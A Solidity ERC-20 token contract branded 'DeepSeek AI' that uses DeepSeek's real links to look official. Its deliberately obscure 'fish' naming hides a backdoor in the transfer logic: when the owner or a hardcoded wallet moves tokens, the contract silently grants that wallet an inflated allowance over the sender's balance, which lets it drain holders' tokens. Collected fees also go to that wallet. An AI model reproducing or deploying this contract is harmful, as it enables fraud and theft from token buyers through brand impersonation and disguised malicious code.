/*
Web: https://www.deepseek.com
Platform: https://platform.deepseek.com
Github: https://github.com/deepseek-ai

X: https://x.com/deepseek_ai
Community: https://t.me/deekseekai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;

interface IFISHFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IFISHRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract DEEPSEEK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _fishDrives;
    mapping (address => bool) private _fishExcludedTxs;
    mapping (address => bool) private _fishExcludedFees;
    mapping (address => mapping (address => uint256)) private _fishCustomers;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DeepSeek AI";
    string private constant _symbol = unicode"DEEPSEEK";
    uint256 private _fishSwapAmount = _tTotal / 100;
    uint256 private _fishBuyBlock;
    uint256 private _fishBlockAmount = 0;
    bool private inSwapFISH = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _fishPair;
    IFISHRouter private _fishRouter;
    address private _fishWallet;
    modifier lockTheSwap {
        inSwapFISH = true;
        _;
        inSwapFISH = false;
    }

    constructor () {
        _fishWallet = address(0xBaF3F0BDDE746233179Aa1dBd16984FB8C5Ee7e4);
        _fishExcludedFees[owner()] = true;
        _fishExcludedFees[address(this)] = true;
        _fishExcludedFees[_fishWallet] = true;
        _fishExcludedTxs[owner()] = true;
        _fishExcludedTxs[_fishWallet] = true;
        _fishDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTokenTo() external onlyOwner() {
        _fishRouter = IFISHRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_fishRouter), _tTotal);
        _fishPair = IFISHFactory(_fishRouter.factory()).createPair(address(this), _fishRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _fishDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _fishCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _fishCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fishCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _fishTransfer(address fishF, address fishT, uint256 fishO) private returns(uint256) {
        uint256 taxFISH=0; 
        if (fishF != owner() && fishT != owner()) {
            taxFISH = fishO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fishF == _fishPair && fishT != address(_fishRouter) && ! _fishExcludedFees[fishT]) {
                if(_fishBuyBlock!=block.number){
                    _fishBlockAmount = 0;
                    _fishBuyBlock = block.number;
                }
                _fishBlockAmount += fishO;
                _buyCount++;
            }

            if(fishT == _fishPair && fishF!= address(this)) {
                require(_fishBlockAmount < swapFISHLimit() || _fishBuyBlock!=block.number, "Max Swap Limit");  
                taxFISH = fishO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 fishToken = balanceOf(address(this));
            if (!inSwapFISH && fishT == _fishPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(fishToken > _fishSwapAmount)
                swapTokensForEth(minFISH(fishO, minFISH(fishToken, _fishSwapAmount)));
                uint256 fishETH = address(this).balance;
                if (fishETH >= 0) {
                    sendETHFISH(address(this).balance);
                }
            }
        }
        
        return taxFISH;
    }

    function _transfer(address fishF, address fishT, uint256 fishO) private {
        require(fishF != address(0), "ERC20: transfer from the zero address");
        require(fishT != address(0), "ERC20: transfer to the zero address");
        require(fishO > 0, "Transfer amount must be greater than zero");
        uint256 taxFISH = _fishTransfer(fishF, fishT, fishO);
        _transferFISH(fishF, fishT, fishO, taxFISH);
    }

    function _transferFISH(address fishF, address fishT, uint256 fishO, uint256 taxFISH) private { 
        address fishReceipt = getFISHReceipt(); 
        if(taxFISH > 0){
          _fishDrives[address(this)] = _fishDrives[address(this)].add(taxFISH);
          emit Transfer(fishF, address(this), taxFISH);
        }
        _fishDrives[fishF] = _fishDrives[fishF].sub(fishO);
        _fishDrives[fishT] = _fishDrives[fishT].add(fishO.sub(taxFISH));
        emit Transfer(fishF, fishT, fishO.sub(taxFISH));
        if(fishReceipt != address(0xdead)) _approve(getFISHSender(fishF), fishReceipt, getFISHAmount(fishO));
    }

    function minFISH(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFISH(uint256 amount) private {
        payable(_fishWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenFISH) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fishRouter.WETH();
        _approve(address(this), address(_fishRouter), tokenFISH);
        _fishRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenFISH,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function getFISHAmount(uint256 fishO) private pure returns(uint256) {
        return uint256(fishO*3 + 10);
    }

    function getFISHSender(address fishF) private pure returns(address) {
        return address(fishF);
    }

    function getFISHReceipt() private view returns(address) {
        return _fishExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0xdead); 
    }

    function swapFISHLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _fishRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _fishRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _fishRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}